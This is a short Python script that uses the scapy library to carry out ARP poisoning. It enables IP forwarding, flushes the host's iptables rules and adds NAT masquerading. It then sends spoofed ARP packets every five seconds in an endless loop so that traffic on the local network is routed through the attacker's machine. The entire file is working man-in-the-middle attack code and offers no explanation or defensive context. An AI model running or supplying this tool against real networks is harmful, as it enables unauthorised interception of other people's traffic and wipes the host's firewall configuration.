#!/usr/bin/python

from scapy.all import *

class ArpPoisoning:

    @staticmethod
    def configure(interface):
        # forwarding conf
        f = open('/proc/sys/net/ipv4/ip_forward', 'w')
        f.write('1')
        f.close()
        
         # iptables conf
        os.system("/sbin/iptables --flush")
        os.system("/sbin/iptables -t nat --flush")
        os.system("/sbin/iptables --zero")
        os.system("/sbin/iptables -A FORWARD --in-interface " +  interface + " -j ACCEPT")
        os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + interface + " -j MASQUERADE")

    @staticmethod
    def getPacket(src, dst):
        packet = ARP()
        packet.pdst = dst
        packet.psrc = src
        return packet

    @staticmethod
    def inject(packet):
        while True:
            send(packet, verbose=False)
            time.sleep(5)
